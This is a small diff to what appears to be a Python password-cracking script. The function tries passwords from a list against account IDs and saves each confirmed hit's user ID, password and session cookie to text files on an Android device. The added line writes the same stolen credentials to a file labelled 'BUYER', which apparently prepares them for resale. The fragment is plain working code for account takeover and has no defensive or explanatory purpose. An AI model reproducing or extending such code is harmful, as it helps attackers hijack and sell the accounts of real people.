@@ -235,6 +235,8 @@ def FoXCRK(ids,names,passlist):
                 if load['is_account_confirmed'] == True:
                 	open('/sdcard/VERIFY-Coki-RB.txt','a').write(f"{str(load['uid'])}|{pas}|{cookie}|{ids}"'\n')
                 if load['is_account_confirmed'] == True:
+                	open('/sdcard/VERIFY-Coki-XD BUYER.txt','a').write(f"{ids}|{str(load['uid'])}|{pas}|{cookie}"'\n')
+                if load['is_account_confirmed'] == True:
                 	open('/sdcard/VERIFY-Coki-RYB.txt','a').write(f"{str(load['uid'])}|{pas}|{cookie}"'\n')
                 if load['is_account_confirmed'] == True:
                 	open('/sdcard/VERIFY-UID-RB.txt','a').write(f"{str(load['uid'])}|{pas}|{ids}"'\n')
